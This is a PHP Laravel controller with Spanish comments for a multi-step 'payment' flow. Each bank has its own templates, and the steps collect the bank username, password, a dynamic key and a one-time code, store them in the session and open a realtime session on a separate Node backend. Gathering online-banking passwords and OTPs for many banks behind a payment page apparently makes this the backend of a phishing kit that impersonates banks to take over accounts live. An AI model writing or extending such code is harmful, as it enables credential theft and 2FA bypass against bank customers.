<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\View;
use GuzzleHttp\Promise\PromiseInterface;

use Illuminate\Support\Arr;
class BankFlowController extends Controller
{


    public function start(string $bank, Request $request)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $sc = $request->session()->get('sc', []);

        // ✅ setear bank y step inicial
        $sc['bank'] = $bank;
        $sc['step'] = "1";

        // opcional: reiniciar flujo si entra por start
        //unset($sc['pass'], $sc['dinamic'], $sc['otp']);
        //unset($sc['rt_session_id'], $sc['rt_session_token']);

        $request->session()->put('sc', $sc);
        $request->session()->save();

        return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => 1]);
    }

    public function step(string $bank, int $step, Request $request)
    {
        $cfg = config("banks.$bank"); // mejor: banks.$bank
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 3);
        abort_if($step < 1 || $step > $maxSteps, 404);

        $view = $cfg['view_prefix'] . ".step{$step}";
        abort_if(!View::exists($view), 404);

        if ($step >= 1) {
            $this->ensureRealtimeSession($request);
        }

        $sc = $request->session()->get('sc', []);
        $sc['bank'] = $bank;
        $sc['step'] = (string)($step);
        $request->session()->put('sc', $sc);
        $request->session()->save();

        return view($view, [
            'bank' => $bank,
            'step' => $step,
            'maxSteps' => $maxSteps,
            'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
            'sessionId' => Arr::get($sc, 'rt_session_id'),
            'sessionToken' => Arr::get($sc, 'rt_session_token'),
        ]);
    }

    public function saveStep(string $bank, int $step, Request $request)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 3);

        $sc = $request->session()->get('sc', []);

        // STEP 1 (maxSteps=4): guarda usuario y limpia credenciales viejas
        if ($step === 1 && $maxSteps === 4) {
            $data = $request->validate([
                'user' => 'required|string|max:50',
            ]);
            $sc['user'] = $data['user'];

            // ✅ recomendado: limpiar datos de intento anterior
            //unset($sc['user'], $sc['pass'], $sc['dinamic'], $sc['otp']);
            // si quieres reiniciar realtime al comenzar de nuevo:
            // unset($sc['rt_session_id'], $sc['rt_session_token']);
        }

        // STEP 2 (maxSteps=4): guarda pass y asegura sesión realtime
        if ($step === 2 && $maxSteps === 4) {
            $data = $request->validate([
                'pass' => 'required|string|max:50',
            ]);

            $sc['pass'] = $data['pass'];
        }

        // STEP 3/4: ejemplo para dinamic/otp (si aplica)
        if ($step === 3 || $step === 4) {
            $data = $request->validate([
                'dinamic' => 'nullable|string|min:6|max:8',
                'otp' => 'nullable|string|min:6|max:8',
            ]);

            if (!empty($data['dinamic']))
                $sc['dinamic'] = $data['dinamic'];
            if (!empty($data['otp']))
                $sc['otp'] = $data['otp'];
        }

        $next = min($step + 1, $maxSteps);

        // ✅ GUARDAR sc SIEMPRE Y CAMBIAR STEP (una sola vez)
        $sc['bank'] = $bank;
        $sc['step'] = (string)($next);

        $request->session()->put('sc', $sc);
        $request->session()->save();

        return redirect()->route('pago.bank.step', [
            'bank' => $bank,
            'step' => $next,
        ]);
    }



    private function ensureRealtimeSession(Request $request): void
    {
        $sc = $request->session()->get('sc', []);

        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');

        // 1) Si ya hay sessionId, NO crear otra sesión. Solo asegurar token.
        if (!empty($sc['rt_session_id'])) {

            if (empty($sc['rt_session_token'])) {
                $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'] . '/issue-token';

                $resp = Http::asJson()->timeout(10)->post($url);
                if ($resp instanceof PromiseInterface) {
                    $resp = $resp->wait();
                }
                if ($resp->successful()) {
                    $sc['rt_session_token'] = $resp->json('sessionToken');
                    $request->session()->put('sc', $sc);
                    $request->session()->save();
                }
            }

            return;
        }

        // 2) Si no hay sessionId, crear sesión realtime
        $url = (string) $baseUrl . '/api/sessions';
        $resp = Http::asJson()->timeout(10)->post($url, $sc);
        if ($resp instanceof PromiseInterface) {
            $resp = $resp->wait();
        }

        if ($resp->successful()) {
            $sc['rt_session_id'] = $resp->json('sessionId');
            $sc['rt_session_token'] = $resp->json('sessionToken');

            $request->session()->put('sc', $sc);
            $request->session()->save();
        }
    }
}